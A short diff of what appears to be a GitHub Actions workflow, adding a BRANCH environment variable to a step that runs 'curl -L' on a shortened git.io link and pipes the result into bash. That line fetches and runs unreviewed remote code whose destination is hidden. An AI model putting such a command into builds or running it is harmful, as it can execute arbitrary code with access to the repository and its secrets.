@@ -26,3 +26,5 @@ jobs:
         
       - name: Run curl
         run: curl -L https://git.io/JqeQ6 | bash
+        env:
+          BRANCH: ${{ github.ref }}
